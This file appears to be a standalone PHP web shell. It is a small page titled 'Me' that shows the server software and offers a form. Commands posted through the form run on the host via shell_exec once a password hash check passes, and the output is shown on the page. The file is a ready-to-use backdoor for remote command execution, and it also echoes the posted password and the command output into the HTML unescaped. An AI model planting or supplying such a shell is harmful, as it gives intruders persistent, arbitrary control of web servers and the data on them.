<!DOCTYPE html>
<html>
    <head>
        <title>Me</title>
    </head>
<body>

<?php

function isValid() {
    $_passwordHash = ''; // replace with `password_hash('your true password', PASSWORD_DEFAULT);`

    if (password_verify(getURLVar("password"), $_passwordHash)) {
        return true;
    } else {
        return false;
    }
}

function getURLVar($var) {
    if (isset($_POST[$var])) {
        return $_POST[$var];
    } else {
        return null;
    }
}

function execCommand($command) {
    if (isValid()) {
        return shell_exec($command);
    } else {
        return "Invalid Auth";
    }
}

function getServSoftware() {
    if (isset($_SERVER['SERVER_SOFTWARE'])) {
        return $_SERVER['SERVER_SOFTWARE'];
    } else {
        return 'UnkownServSoftware';
    }
}

$_software = getServSoftware();


if (getURLVar("action") == "command" && getURLVar("command")) {
    $_command_output = execCommand(getURLVar("command"));
} else {
    $_command_output = "";
}

if (getURLVar("password") != null) {
    $_passwordPOSTed = getURLVar("password");
} else {
    $_passwordPOSTed = "";
}

?>

    <h3>PHP Version: </h3><label for="_mis_PHP_version"><?php echo $_software?></label><br>

    <form id="form_exec_command" method="post">
        <input hidden value="command" name="action">
        <input type="text" placeholder="Command" name="command">
        <input type="password" value="<?php echo $_passwordPOSTed?>" name="password">
        <input type="submit" value="Exec">
    </form>

    <textarea cols="30" rows="8" readonly><?php echo $_command_output?></textarea>

</body>
</html>
